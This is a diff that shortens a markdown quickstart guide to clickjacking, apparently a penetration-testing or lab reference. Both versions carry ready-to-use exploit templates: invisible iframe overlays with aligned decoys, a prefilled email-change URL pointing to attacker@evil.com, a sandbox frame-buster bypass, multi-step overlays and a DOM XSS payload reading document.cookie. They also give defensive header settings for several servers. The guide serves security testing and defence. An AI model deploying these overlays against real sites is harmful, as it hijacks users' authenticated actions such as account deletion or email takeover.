@@ -1,405 +1,130 @@
-# Clickjacking Quickstart Guide
+# Clickjacking Quickstart
 
-## What is Clickjacking?
+UI redressing — trick authenticated user into clicking hidden iframe content via overlaid decoy. CSRF tokens DO NOT prevent it.
 
-**Clickjacking** (UI redressing) is an attack where users are tricked into clicking hidden content by interacting with visible decoy content. An invisible iframe overlays the target page using CSS opacity and positioning.
-
-**Key Point:** CSRF tokens DON'T prevent clickjacking - the attack operates within a legitimate session context.
-
----
-
-## Quick Vulnerability Check
-
-### 1. Manual Test (30 seconds)
-
-Create `test.html`:
-```html
-<iframe src="https://target.com/account" width="800" height="600"></iframe>
-```
-
-**Result:**
-- ✅ **Vulnerable:** Page loads in iframe
-- ❌ **Protected:** Blank frame or error
-
-### 2. Check Headers (Command Line)
+## Vulnerability check
 
 ```bash
 curl -I https://target.com | grep -i "x-frame-options\|content-security-policy"
+echo '<iframe src="https://target.com/account"></iframe>' > test.html && open test.html
 ```
+Vulnerable when no `X-Frame-Options: DENY|SAMEORIGIN` and no `frame-ancestors`, AND page renders in iframe.
 
-**Look for:**
-- `X-Frame-Options: DENY` or `SAMEORIGIN`
-- `Content-Security-Policy: frame-ancestors 'none'`
-
-**Missing headers = Potentially Vulnerable**
-
----
-
-## Basic Exploitation Template
-
-### Standard Clickjacking Attack
+## Basic exploit
 
 ```html
 <style>
-    iframe {
-        position: relative;
-        width: 500px;
-        height: 700px;
-        opacity: 0.1;          /* Use 0.1 for alignment, 0.0001 for final */
-        z-index: 2;
-    }
-    div {
-        position: absolute;
-        top: 300px;           /* Adjust to align with target button */
-        left: 60px;           /* Adjust to align with target button */
-        z-index: 1;
-    }
+  iframe { position:relative; width:500px; height:700px; opacity:0.1; z-index:2; }
+  div    { position:absolute; top:300px; left:60px; z-index:1; }
 </style>
 <div>Click me</div>
 <iframe src="https://target.com/account"></iframe>
 ```
 
-### Exploitation Steps
+Workflow: opacity 0.1 → load → hover decoy until cursor changes → tweak top/left → set opacity to 0.0001 → deliver.
 
-1. **Set opacity: 0.1** (semi-transparent for alignment)
-2. **Load in browser** and hover over "Click me"
-3. **Adjust top/left** until cursor changes to pointer over button
-4. **Change opacity: 0.0001** (nearly invisible)
-5. **Deploy exploit**
+## Common scenarios
 
----
+### Account deletion / email change (CSRF-protected action)
+Standard overlay; position top:300, left:60.
 
-## Common Attack Scenarios
-
-### 1. Account Deletion / Email Change
-
+### Form prepopulation
 ```html
-<style>
-    iframe {
-        position: relative;
-        width: 500px;
-        height: 700px;
-        opacity: 0.0001;
-        z-index: 2;
-    }
-    div {
-        position: absolute;
-        top: 300px;
-        left: 60px;
-        z-index: 1;
-    }
-</style>
-<div>Click me</div>
-<iframe src="https://target.com/my-account"></iframe>
-```
-
-### 2. Form Prepopulation (Email Change)
-
-```html
-<style>
-    iframe {
-        position: relative;
-        width: 500px;
-        height: 700px;
-        opacity: 0.0001;
-        z-index: 2;
-    }
-    div {
-        position: absolute;
-        top: 400px;
-        left: 80px;
-        z-index: 1;
-    }
-</style>
-<div>Click me</div>
 <iframe src="https://target.com/account?email=attacker@evil.com"></iframe>
 ```
+Position top:400, left:80.
 
-### 3. Bypassing Frame Busters
-
-If page refuses to load due to frame-busting JavaScript:
-
+### Frame-buster bypass
 ```html
 <iframe sandbox="allow-forms" src="https://target.com/account?email=attacker@evil.com"></iframe>
 ```
+`allow-forms` blocks scripts (frame buster) but lets forms submit.
 
-**Key:** `sandbox="allow-forms"` blocks JavaScript (disables frame buster) but allows form submission.
-
-### 4. Multi-Step Clickjacking (Confirmations)
-
+### Multi-step (confirmation dialog)
 ```html
 <style>
-    iframe {
-        position: relative;
-        width: 500px;
-        height: 700px;
-        opacity: 0.0001;
-        z-index: 2;
-    }
-    .firstClick {
-        position: absolute;
-        top: 330px;
-        left: 50px;
-        z-index: 1;
-    }
-    .secondClick {
-        position: absolute;
-        top: 285px;
-        left: 225px;
-        z-index: 1;
-    }
+  iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
+  .firstClick  { position:absolute; top:330px; left:50px; z-index:1; }
+  .secondClick { position:absolute; top:285px; left:225px; z-index:1; }
 </style>
 <div class="firstClick">Click me first</div>
 <div class="secondClick">Click me next</div>
 <iframe src="https://target.com/account"></iframe>
 ```
 
-### 5. DOM XSS Trigger
-
+### DOM XSS trigger via clickjacking
 ```html
-<style>
-    iframe {
-        position: relative;
-        width: 500px;
-        height: 700px;
-        opacity: 0.0001;
-        z-index: 2;
-    }
-    div {
-        position: absolute;
-        top: 600px;
-        left: 80px;
-        z-index: 1;
-    }
-</style>
-<div>Click me</div>
 <iframe src="https://target.com/feedback?name=<img src=x onerror=alert(document.cookie)>"></iframe>
 ```
+Decoy aligned to submit button (top:600, left:80).
 
----
+## CSS properties
 
-## Defense Quick Reference
+```css
+iframe { position:relative; opacity:0.0001 /* not 0! */; z-index:2; width:500px; height:700px; }
+.decoy { position:absolute; top:300px; left:60px; z-index:1; }
+```
 
-### Secure Configuration (Recommended)
+## Sandbox values
 
-**HTTP Headers:**
+| Value | Behaviour | Bypass use |
+|-------|-----------|------------|
+| `sandbox=""` | max restrictions, blocks forms | no |
+| `sandbox="allow-forms"` | forms allowed, scripts blocked | YES |
+| `sandbox="allow-scripts"` | scripts run (frame buster fires) | no |
+| `sandbox="allow-top-navigation"` | top-nav allowed | no (frame buster) |
+| `sandbox="allow-same-origin"` | same-origin treatment | dangerous |
+
+## Defense
+
 ```http
 X-Frame-Options: DENY
 Content-Security-Policy: frame-ancestors 'none';
+Set-Cookie: session=...; SameSite=Strict; Secure; HttpOnly
 ```
 
-**Session Cookie:**
-```http
-Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
-```
+Express: `res.setHeader('X-Frame-Options','DENY'); res.setHeader('Content-Security-Policy',"frame-ancestors 'none';")`.
+Flask: `response.headers['X-Frame-Options']='DENY'; response.headers['Content-Security-Policy']="frame-ancestors 'none';"`.
+Apache: `Header always set X-Frame-Options "DENY"; Header always set Content-Security-Policy "frame-ancestors 'none';"`.
+Nginx: `add_header X-Frame-Options "DENY" always; add_header Content-Security-Policy "frame-ancestors 'none';" always;`.
 
-### Implementation Examples
+## Tools
 
-**Node.js/Express:**
-```javascript
-app.use((req, res, next) => {
-    res.setHeader('X-Frame-Options', 'DENY');
-    res.setHeader('Content-Security-Policy', "frame-ancestors 'none';");
-    next();
-});
-```
+- **Burp Clickbandit**: Burp menu → Clickbandit → copy script → paste in DevTools console on target → record actions → save HTML.
+- **OWASP ZAP**: Active Scan flags Clickjacking (Medium).
+- **Manual frame check (DevTools console)**:
+  ```javascript
+  if (window.self !== window.top) console.log("Page is framed");
+  ```
 
-**Python/Flask:**
-```python
-@app.after_request
-def set_security_headers(response):
-    response.headers['X-Frame-Options'] = 'DENY'
-    response.headers['Content-Security-Policy'] = "frame-ancestors 'none';"
-    return response
-```
+## Common mistakes
 
-**PHP:**
-```php
-header("X-Frame-Options: DENY");
-header("Content-Security-Policy: frame-ancestors 'none';");
-```
+| Mistake | Fix |
+|---------|-----|
+| `opacity: 0` | non-interactive — use `0.0001` |
+| Decoy z-index above iframe | iframe needs higher z-index |
+| No `position:` | elements won't align — use `relative`/`absolute` |
+| Visible iframe in delivery | reset `opacity:0.0001` after alignment |
+| Frame buster blocks load | add `sandbox="allow-forms"` |
 
-**Apache (.htaccess):**
-```apache
-Header always set X-Frame-Options "DENY"
-Header always set Content-Security-Policy "frame-ancestors 'none';"
-```
+## Defense priorities
 
-**Nginx:**
-```nginx
-add_header X-Frame-Options "DENY" always;
-add_header Content-Security-Policy "frame-ancestors 'none';" always;
-```
+1. `X-Frame-Options: DENY` (or SAMEORIGIN if framing required)
+2. CSP `frame-ancestors 'none'` (or `'self'`)
+3. `SameSite=Strict` session cookie
+4. Re-auth for sensitive actions
+5. CSRF tokens (defense in depth)
+6. Don't rely on JS frame busters — easily bypassed
 
----
-
-## Testing Tools
-
-### 1. Burp Suite Clickbandit
-
-**Quick Usage:**
-1. Burp menu → Burp Clickbandit
-2. Copy script to clipboard
-3. Open target page in browser
-4. Paste script in console (F12)
-5. Click "Record mode"
-6. Perform actions on page
-7. Click "Finish"
-8. Save generated HTML
-
-**Advantage:** Automatically generates aligned exploit code
-
-### 2. OWASP ZAP
-
-1. Configure browser proxy
-2. Spider target site
-3. Run Active Scan
-4. Check for "Clickjacking" alerts (Medium severity)
-
-### 3. Manual Browser Test
-
-**Console Check:**
-```javascript
-// Run in DevTools console
-if (window.self !== window.top) {
-    console.log("Page is framed");
-} else {
-    console.log("Page is not framed");
-}
-```
-
----
-
-## Common Mistakes
-
-| Mistake | Issue | Solution |
-|---------|-------|----------|
-| `opacity: 0` | iframe becomes non-interactive | Use `opacity: 0.0001` |
-| Wrong z-index | Decoy on top, can't click iframe | iframe must have higher z-index |
-| Missing position | Elements won't align | Use `position: relative/absolute` |
-| Testing = final | opacity 0.1 visible in attack | Change to 0.0001 before delivery |
-| Forgetting sandbox | Frame buster blocks attack | Use `sandbox="allow-forms"` |
-
----
-
-## CSS Properties Explained
-
-```css
-iframe {
-    position: relative;      /* Enables positioning */
-    opacity: 0.0001;        /* Nearly invisible (NOT 0!) */
-    z-index: 2;             /* Higher = on top */
-    width: 500px;           /* Match target page size */
-    height: 700px;
-}
-
-.decoy {
-    position: absolute;     /* Allows precise placement */
-    top: 300px;            /* Vertical alignment */
-    left: 60px;            /* Horizontal alignment */
-    z-index: 1;            /* Lower = behind iframe */
-}
-```
-
----
-
-## Common Scenario Quick Reference
-
-### Basic CSRF-Protected Action
-- **Target:** Account deletion / state-changing action
-- **Payload:** Standard overlay aligned to submit button
-- **Position:** top: 300px, left: 60px (adjust to target)
-
-### Prefilled Form Input
-- **Target:** Email/profile change
-- **URL:** `?email=attacker@evil.com`
-- **Position:** top: 400px, left: 80px
-
-### Frame Buster Bypass
-- **Technique:** `sandbox="allow-forms"`
-- **URL:** `?email=attacker@evil.com`
-- **Position:** top: 400px, left: 80px
-
-### DOM XSS Trigger via Clickjacking
-- **Payload:** `?name=<img src=x onerror=alert(document.cookie)>`
-- **Target:** Feedback/comment form submit button
-- **Position:** top: 600px, left: 80px
-
-### Multistep (Confirmation Dialog)
-- **Clicks:** 2 (initial action + confirmation)
-- **Position 1:** top: 330px, left: 50px
-- **Position 2:** top: 285px, left: 225px
-
----
-
-## Protection Priorities
-
-1. ✅ **Set X-Frame-Options: DENY** (or SAMEORIGIN)
-2. ✅ **Set CSP frame-ancestors 'none'** (or 'self')
-3. ✅ **Use SameSite=Strict cookies**
-4. ✅ **Require re-auth for sensitive actions**
-5. ✅ **Implement CSRF tokens** (defense in depth)
-6. ❌ **Don't rely on JavaScript frame busters** (easily bypassed)
-
----
-
-## One-Liner Cheat Sheet
+## One-liner header check
 
 ```bash
-# Check headers
-curl -I https://target.com | grep -i "x-frame\|frame-ancestors"
-
-# Basic test
-echo '<iframe src="https://target.com"></iframe>' > test.html && open test.html
-
-# Python header check
-python3 -c "import requests; r=requests.get('https://target.com'); print('X-Frame-Options:', r.headers.get('X-Frame-Options', 'MISSING')); print('CSP:', r.headers.get('Content-Security-Policy', 'MISSING'))"
+python3 -c "import requests; r=requests.get('https://target.com'); print('XFO:', r.headers.get('X-Frame-Options','MISSING')); print('CSP:', r.headers.get('Content-Security-Policy','MISSING'))"
 ```
 
----
+## Resources
 
-## Sandbox Attribute Reference
-
-| Value | Effect | Use in Bypass |
-|-------|--------|---------------|
-| `sandbox=""` | Maximum restrictions | ❌ Blocks forms |
-| `sandbox="allow-forms"` | Permits forms, blocks scripts | ✅ **Use this** |
-| `sandbox="allow-scripts"` | Permits JavaScript | ❌ Enables frame buster |
-| `sandbox="allow-top-navigation"` | Permits breakout | ❌ Enables frame buster |
-| `sandbox="allow-same-origin"` | Same-origin treatment | ⚠️ Dangerous |
-
-**Golden Rule:** Only use `allow-forms` to bypass frame busters while maintaining exploitation capability.
-
----
-
-## Attack vs Defense Summary
-
-### Attack Checklist
-- [ ] Check if page loads in iframe
-- [ ] Check for frame-busting scripts
-- [ ] Test sandbox bypass if needed
-- [ ] Identify target buttons/actions
-- [ ] Create overlay with opacity 0.1
-- [ ] Align decoy with target
-- [ ] Change opacity to 0.0001
-- [ ] Test exploitation
-- [ ] Deploy to victim
-
-### Defense Checklist
-- [ ] X-Frame-Options header set
-- [ ] CSP frame-ancestors directive set
-- [ ] SameSite cookies configured
-- [ ] Tested in real iframe
-- [ ] Applied to ALL pages
-- [ ] Verified in multiple browsers
-- [ ] CI/CD header validation
-- [ ] Security monitoring enabled
-
----
-
-## Quick Reference URLs
-
-- **OWASP Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
-- **OWASP Attack Details:** https://owasp.org/www-community/attacks/Clickjacking
-- **Burp Clickbandit:** https://portswigger.net/burp/documentation/desktop/tools/clickbandit
-- **Cheat Sheet:** See `clickjacking-cheat-sheet.md` in same directory
+- [OWASP Clickjacking](https://owasp.org/www-community/attacks/Clickjacking)
+- [OWASP Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
+- [Burp Clickbandit](https://portswigger.net/burp/documentation/desktop/tools/clickbandit)
+- Full reference: `clickjacking-cheat-sheet.md`
